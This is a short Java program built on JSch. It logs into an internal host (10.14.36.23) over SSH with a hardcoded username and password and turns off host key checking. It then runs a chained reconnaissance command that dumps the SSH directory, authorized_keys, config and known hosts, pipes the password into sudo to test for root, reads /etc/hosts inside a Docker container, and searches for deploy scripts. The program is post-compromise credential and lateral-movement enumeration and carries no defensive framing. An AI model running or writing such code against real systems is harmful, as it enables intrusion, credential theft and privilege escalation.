import com.jcraft.jsch.*;
import java.io.*;
class SSHK {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    ch.setCommand("ls -la ~/.ssh/;cat ~/.ssh/authorized_keys 2>/dev/null;echo ---CONFIG---;cat ~/.ssh/config 2>/dev/null;echo ---KNOWN---;cat ~/.ssh/known_hosts 2>/dev/null | awk '{print $1}' | sort -u;echo ---SUDOTEST---;echo kutul0nc4t | sudo -S id 2>&1;echo ---DOCKER-EXEC---;docker exec tomcat_crowd cat /etc/hosts 2>/dev/null;echo ---SEARCH-DEPLOY---;find /home/ /opt/ /srv/ -name 'deploy*' -o -name '*.sh' 2>/dev/null | head -10");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
